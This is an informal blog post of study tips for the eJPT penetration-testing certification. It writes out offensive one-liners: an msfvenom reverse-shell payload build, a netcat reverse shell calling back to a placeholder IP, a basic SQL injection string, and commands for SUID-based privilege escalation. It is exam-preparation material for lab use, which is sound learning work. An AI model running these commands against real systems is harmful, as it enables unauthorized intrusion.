---
layout: post
title: EJPT Guide
category: Red Teaming
---


Alright fam, Scro11z back at it.

So you’re thinking about taking the **eJPT**? Cool. I took it before I even had a website, didn’t write a walkthrough *my bad*. But I’m here now to drop the real tea on what it’s actually like in **2025**, not some outdated blog post.

Look yeah, people hype it up, act like it’s OSCP-level hard. Nah. It’s **hands-on**, yeah, but if you know your basics and don’t panic, you’ll be fine.

---

### Know Your Shit (And Your Gaps)

Everybody learns different. Some people watch videos. Some read. I **Jump into the flames till i get it**. You gotta figure out how *you* learn.

But here’s the truth: **if you can’t move around Linux in terminal, stop. Go learn that first.** No shame. I started with **Hackersploit** their [Linux Essentials](https://hackersploit.org/linux-essentials-for-hackers/) course? *Chef’s kiss*. Still use stuff from it.

---

### Tools You Gotta Know (Like, Actually Know ‘Em)

#### **Nmap? Yeah, but not just “nmap (ip)”**
You gotta go deeper.  
`nmap -sV -sC -p- --open` — that’s your bread and butter.  
Find services, versions, scripts. Look for low-hanging fruit.

And **man pages**? Don’t sleep on ‘em.  
If you blank on a command — `man nmap`, `nmap --help`. Boom. Answers.

#### **Metasploit = Your Best Friend**
You *will* use it. Learn the flow:
- `searchsploit [service]` → find an exploit
- `msfconsole` → `use exploit/...` → `set RHOSTS` → `set LHOST` → `exploit`
- Get a shell? Congrats. Now **don’t trip** — `sysinfo`, `getuid`, see what you’re working with.

And **msfvenom**? For payloads.  
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=your_ip LPORT=4444 -f exe > shell.exe`  
Then serve it, get that callback.

#### **Netcat & Reverse Shells**
You’ll see “pop a shell” and panic. Don’t.

Reverse shell = you send a payload, target connects *back* to you.  
You run: `nc -lvnp 4444`  
They call: `nc YOUR_IP 4444 -e /bin/bash` (Linux)  
Or use [revshells.com](https://www.revshells.com) — cheat code for noobs (and pros who forget).

---

### Priv Esc — SUID, GTFOBins, LinPEAS

Once you’re in, you’re probably not root. So **escalate**.

- `find / -type f -perm -04000 2>/dev/null` → find SUID bins
- Use **GTFOBins** ([gtfobins.github.io](https://gtfobins.github.io)) — it’s *magic*. Type the binary, get escalation tricks.
- Upload **LinPEAS** with `wget` or `scp` — let it do the work for you.

---

### Web Stuff? Yeah, You Gotta Hack That IIS Server

They *will* throw you a **Windows IIS box**. Probably running some old ASP or PHP thing.

- Know **OWASP Top 10** — especially **file upload**, **SQLi**, **XSS**
- Use `gobuster dir -u http://target -w common.txt` to find `/admin`, `/backup`, etc.
- Try **manual SQLi** — `' or 1=1--` still works sometimes lol
- `searchsploit` for known exploits — if it’s running an old CMS, there’s probably a public exploit

---

### Exam Tips (From Someone Who’s Been There)

- **It’s open book. Use it.** Google, notes, Hackersploit, INE — all fair game.
- **Enumerate like a maniac.** Run scans, save output, check everything twice.
- **Don’t brute-force blindly.** Use `hydra` smart — right service, right wordlist (`rockyou.txt`).
- **Pivot.** Get in one box? Scan the internal net. Use `arp-scan`, `nmap`, see what else is alive.
- **Take breaks.** I did mine over two days. Brain gets tired. Step away, come back fresh.

---

### Final Thoughts

The eJPT? It’s not about being a genius. It’s about **process**.  
Recon → Scan → Exploit → Escalate → Pivot → Repeat.

If you know the tools, stay calm, and don’t overthink it — you’ll pass.

And yeah… I should’ve made a write-up. But now you got this.  
Go get that cert. Drop a like. Stay sharp. ✌️

